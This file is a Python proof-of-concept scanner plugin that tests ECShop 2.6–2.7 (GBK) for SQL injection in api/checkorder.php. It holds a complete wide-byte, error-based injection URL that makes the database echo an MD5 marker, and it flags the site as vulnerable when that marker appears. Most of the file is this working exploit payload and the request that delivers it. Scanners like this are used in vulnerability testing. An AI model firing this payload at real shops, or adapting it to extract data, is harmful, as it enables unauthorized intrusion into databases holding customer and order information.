#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  ecshop 注入通杀2.6-2.7 GBK版本
References:  http://www.shellsec.com/tech/74933.html
Author    :  13
QQ        :  779408317
"""
def assign(service, arg):
    if service == "ecshop":
        return True, arg

def audit(arg):
    payload = "api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20md5(3.1415)%20%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.example.com/')[1])